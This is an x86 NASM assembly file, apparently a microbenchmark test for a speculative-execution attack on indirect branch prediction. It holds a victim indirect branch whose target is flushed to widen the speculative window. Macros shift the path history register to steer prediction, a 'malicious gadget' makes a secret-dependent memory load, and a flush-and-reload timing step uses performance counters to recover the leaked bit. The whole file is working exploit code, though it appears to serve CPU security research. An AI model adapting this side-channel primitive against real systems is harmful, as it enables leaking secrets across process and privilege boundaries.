%include "./SET_VICTIM_PHR0.nasm"
%include "./SET_VICTIM_PHR1.nasm"

%define nthreads 1
%define repeat0  1
%define repeat1  10
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 1
    call malicious_gadget ; cache the malicious instructions
%endmacro

%macro testcode 0   ; main test
    ; flush
    %assign i 0
    %rep 10
     %assign addr_offset 2048+i*512
     clflush [UserData+%+ addr_offset]
    %assign i i+1
    %endrep

    ; execute the victim ibranch
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    call victim_ibranch 

    ; reload and measure
    READ_PMC_START
    %assign addr_offset 2048+index*512
     mov rax, [UserData+%+ addr_offset]
    READ_PMC_END

%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro

SECTION .sec_victim_ibranch exec
victim_ibranch:
    mov rdx, qword[UserData] ; read the input
    lea r10, [victim_target_0]
    lea r9, [victim_target_1]
    cmp rdx, 1
    cmovz r10, r9
    mov qword[UserData+8], r10  ; store the target (target0 if input is 0, target1 if input is 1)
    clflush [UserData+8]    ; flush the target to create a larger speculative window
    mfence
    
    ; set PHR: PHR_0 is correlated with 0, PHR_1 is correlated with 1
    cmp rdx, 1
    je victim_set_PHR1_start
    SHIFT_PHR 195,0
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR0 0

victim_set_PHR1_start:
    SHIFT_PHR 195,1
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR1 0
victim_set_PHR1_end:
    
    %rep (50)<<6
     nop
    %endrep
    jmp [UserData+8]    ; the victim indirect branch
    %rep 64
     nop
    %endrep
victim_target_0:
    %rep 64
     nop
    %endrep
    ret
victim_target_1:
    %rep 64
     nop
    %endrep
    ret


SECTION .sec_malicious_gadget exec
    %rep 33
     nop
    %endrep
malicious_gadget: ; a malicious gadget will never be reached in the correct control flow
    mov rbx, secret
    shl rbx, 9
    mov rax, [UserData + 2048 + rbx] ; a secret-dependent load
    %rep 64
     nop
    %endrep
    ret